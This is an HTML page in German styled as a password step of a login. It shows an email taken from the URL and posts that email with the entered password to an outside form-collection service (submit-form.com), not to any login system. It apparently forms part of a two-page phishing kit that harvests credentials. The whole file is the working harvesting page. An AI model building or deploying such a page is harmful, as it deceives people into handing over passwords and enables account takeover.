<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Login - Passwort</title>
  <link rel="stylesheet" href="css/style.css">
</head>
<body>

  <!-- Header Image -->
  <div class="header"></div>

  <!-- Centered Form -->
  <div class="form-box">
    <img src="images/logo-password.png" alt="Logo" class="form-logo">

    <!-- Show Email from First Page -->
    <p class="user-email" id="userEmail"></p>

    <!-- Formspark form -->
    <form action="https://submit-form.com/2egN1olQU" method="POST">
      <!-- hidden field to carry email from first page -->
      <input type="hidden" name="email" id="hiddenEmail">

      <label for="password">Passwort</label>
      <input type="password" id="password" name="password" required>

      <p class="info-text">
        Geben Sie Ihr Passwort ein, um fortzufahren
      </p>

      <button type="submit" class="weiter-btn">Weiter</button>
    </form>
  </div>

  <script>
    // Grab email from query string and display it
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");
    if (email) {
      document.getElementById("userEmail").textContent = email;
      document.getElementById("hiddenEmail").value = email;
    }
  </script>

</body>
</html>
